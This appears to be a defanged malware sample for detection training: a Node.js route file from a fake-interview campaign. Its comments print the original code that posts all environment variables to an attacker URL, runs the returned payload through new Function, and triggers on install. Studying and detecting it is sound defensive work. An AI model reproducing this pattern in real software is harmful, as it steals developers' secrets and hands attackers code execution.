// ====================================================================
// SAMPLE: routes/api/auth.js from a Contagious Interview campaign
// instance (anonymized excerpt).
// Date first encountered: 2026-04-08
//
// ⚠️  DISARMED — this file has been deliberately defanged so it will
//    NOT execute even if accidentally run with `node`. The require(),
//    base64 URL, and auto-execution call are all commented out.
//    The original patterns are preserved for study and detection
//    training only.
//
// What the ORIGINAL (armed) code does:
//   1. Decodes a base64-encoded URL to produce an exfiltration endpoint.
//   2. POSTs the entire process.env to the attacker.
//   3. Receives a JavaScript payload in the response.
//   4. Executes the payload via new Function() with `require` injected,
//      giving the attacker full Node.js capability.
//
// Detection rules that catch this:
//   - OB-003 (base64 literal within 5 lines of dynamic execution)
//   - OB-004 (remote code execution via new Function with variable body)
//   - EX-001 (axios.post with process.env as body)
//   - EX-002 (decoded URL used as exfil endpoint)
// ====================================================================

// DISARMED: require commented out to prevent network calls
// ORIGINAL: const axios = require("axios");
const axios = null; // stub — file is disarmed

// Base64-encoded URL.
// ORIGINAL decodes to: https://ipcheck-six.vercel.app/api
// (attacker-controlled Vercel throwaway subdomain — infrastructure,
// not a legitimate brand)
//
// DISARMED: URL broken with [DEFANGED] insertion so base64 decode
// produces garbage even if someone extracts the string.
const authKey = "aHR0cHM6Ly9[DEFANGED]pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==";

// ORIGINAL: const AUTH_API = Buffer.from(authKey, "base64").toString();
const AUTH_API = "[DEFANGED — see comment above for original pattern]";

exports.verifyAuth = async () => {
  try {
    // EX-001: POST process.env to attacker
    // EX-002: AUTH_API is a decoded-at-runtime URL
    //
    // ORIGINAL (armed):
    // const { data } = await axios.post(AUTH_API, { ...process.env });
    //
    // DISARMED: no network call is made.
    const data = null;

    if (data && data.code) {
      // OB-004: remote code execution via new Function
      // with a variable body fetched over HTTP.
      // This is the stage-2 loader.
      //
      // ORIGINAL (armed):
      // new Function("require", data.code)(require);
      //
      // DISARMED: never reached (data is null above).
      console.log("[DISARMED] Would have executed: new Function('require', data.code)(require)");
    }
  } catch (err) {
    console.error("Auth verification failed:", err.message);
  }
};

// ORIGINAL (armed):
// exports.verifyAuth();
//
// ^^^ This line auto-executes the exfil chain at module-load time.
// In the real attack, this fires the moment server.js wires up routes,
// which happens automatically via the "prepare" hook during npm install.
//
// DISARMED: auto-execution removed. The function exists but is never called.
// To study the flow, read the comments above. Do not uncomment the call.
